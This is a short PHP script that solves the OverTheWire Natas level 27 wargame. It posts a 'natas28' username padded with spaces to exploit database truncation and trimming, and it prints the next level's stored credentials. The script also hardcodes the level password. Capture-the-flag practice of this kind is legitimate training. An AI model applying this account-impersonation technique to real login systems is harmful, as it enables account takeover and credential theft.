<?php
include_once "./functions.php";
$url = "http://natas27.natas.labs.overthewire.org/index.php";
$ch = curl_init ($url);
curl_setopt($ch, CURLOPT_USERPWD,"natas27:PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3");  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_POSTFIELDS, "username=natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++n&password=");
$output = curl_exec($ch);
curl_close($ch);
$url = "http://natas27.natas.labs.overthewire.org/index.php";
$ch2 = curl_init ($url);
curl_setopt($ch2, CURLOPT_USERPWD,"natas27:PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3");  
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch2, CURLOPT_POSTFIELDS, "username=natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++&password=");
$output2 = curl_exec($ch2);
curl_close($ch2);
echo get_string_between($output2,"<br>Array\n(\n",")");
?>